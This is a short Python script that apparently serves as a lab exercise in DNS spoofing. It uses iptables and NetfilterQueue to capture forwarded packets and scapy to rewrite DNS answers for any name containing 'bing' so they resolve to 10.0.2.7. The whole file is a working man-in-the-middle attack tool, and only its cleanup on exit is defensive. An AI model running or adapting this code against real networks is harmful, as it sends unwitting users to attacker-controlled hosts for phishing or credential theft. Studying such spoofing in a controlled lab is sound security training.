#!/usr/bin/env python

import subprocess
import scapy.all as scapy
import netfilterqueue


def trap_packets():
    #To trap packets from other computer
    subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num","0"])
    #--------------------------------------
    #To trap packets coming to my computer for testing purposes
    #subprocess.call(["iptables","-I","OUTPUT","-j","NFQUEUE","--queue-num","0"])
    #subprocess.call(["iptables","-I","INPUT","-j","NFQUEUE","--queue-num","0"])

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "bing" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname,rdata="10.0.2.7")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
   
    packet.accept()

try:
    trap_packets()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call(["iptables","--flush"])
    print("[-] Flushing iptables and quitting....")
